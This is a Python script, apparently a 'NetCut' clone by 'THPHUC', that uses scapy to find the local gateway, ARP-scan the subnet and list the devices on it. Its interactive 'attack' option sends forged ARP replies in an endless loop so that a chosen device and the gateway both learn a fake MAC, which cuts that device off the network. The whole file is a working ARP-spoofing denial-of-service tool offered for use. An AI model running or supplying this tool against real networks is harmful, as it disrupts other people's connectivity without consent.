from scapy.all import *
from mac_vendor_lookup import MacLookup
import subprocess

print("NETCUT BY THPHUC")

def get_gw_and_network():
	global gw, mac_gw, network
# LẤY RA GATEWAY
	tracert = traceroute('8.8.8.8', maxttl=1, verbose=0)
	gw = tracert[0][0][1].src
# LẤY RA MAC GATEWAY
	get_mac_gw = sr(ARP(pdst=gw), verbose=0)
	mac_gw = get_mac_gw[0][0][1].hwsrc
# LẤY RA LỚP MẠNG
	ip_local = IP(dst=gw).src
	a = ip_local.split('.')
	a[-1] = '0'
	network = '.'.join(a) + "/24"

def scan_network(network):
	global lsts
	print("Scanning Network...")
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network), timeout=2.5, verbose=0)
	lsts = []
	for i in range(len(ans)):
		ip = ans[i][1].psrc
		mac = ans[i][1].hwsrc
		lsts.append([ip, mac])
	print('-'*110)
	print("Target ID\tIP\t\t\tMAC\t\t\t\tDevices")
	for j in range(len(lsts)):
		ip = lsts[j][0]
		mac = lsts[j][1]
		device_name = MacLookup().lookup(mac)
		print("[ %s ]\t\t%s\t\t%s\t\t%s" % (j, ip, mac, device_name))
	print('-'*110)

def attack(choice_target):
	mac_fake = "12:34:56:78:9A:BC"
	target = lsts[choice_target]
	packet = ARP(psrc=gw, hwsrc=mac_fake, pdst=target[0], hwdst=target[1], op=2)
	packet_2 = ARP(psrc=target[0], hwsrc=mac_fake, pdst=gw, hwdst=mac_gw, op=2)
	print("[+] Attack %s !" % (target[0]))
	while True:
		send(packet, verbose=0)
		send(packet_2, verbose=0)

get_gw_and_network()
scan_network(network)
print('r - refresh | a - attack | h - help | q - quit |')
choice_option = input('Option> ')
while True:
	lst_choice = choice_option.split()
	if lst_choice[0] == 'r':
		print()
		scan_network(network)
	elif lst_choice[0] == 'a':
		try:
			choice_target = int(lst_choice[1])
			attack(choice_target)
		except:
			print('Attack: Usage option a with target id. Example: a 1')
			print()
	elif lst_choice[0] == 'h':
		print("""
a	Attack with target id. Example: a 1
c	Clear screen
r	Refresh network list
q	Quit
""")
		print()
	elif lst_choice[0] == 'q':
		break
	elif lst_choice[0] == 'c':
		try:
			subprocess.call('clear')
		except:
			subprocess.call('cls', shell=True)
	else:
		print('Input Error')
		print()
	print('r - refresh | a - attack | h - help | q - quit |')
	choice_option = input('Option> ')
print("See you again !")
